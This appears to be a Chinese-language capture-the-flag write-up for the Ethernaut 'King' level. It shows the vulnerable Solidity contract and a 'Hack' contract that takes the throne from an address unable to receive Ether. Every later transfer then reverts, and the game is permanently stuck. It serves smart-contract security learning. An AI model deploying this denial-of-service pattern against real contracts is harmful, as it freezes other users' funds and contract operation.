# Ethernaut 09-King

## 本关目标

- 让 King 合约不能再设置新的 king

## 合约分析

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    // 只要转账金额大于之前的prize或者是owner，就可以继续
    require(msg.value >= prize || msg.sender == owner);
    // 使用transfer进行转账，如果转账失败会抛出错误
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}
```

## 解决方案

1. 使用 Hack 合约向 King 合约转账，且金额等于 prize，Hack 中不存在 receive()和 fallback()
2. 这样当有新的 king 要生效时，会向 Hack 转账，但是转账永远不会成功，一直抛出错误，无法继续声明新 king

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./King.sol";

contract Hack {
    King public immutable king;

    // 部署时传入King实例的地址
    constructor(address payable _target) payable{
        king = King(_target);
    }

    function hack() public payable{
        (bool success,) = address(king).call{value: king.prize()}("");
        require(success, "pay failed!");
    }
}
```
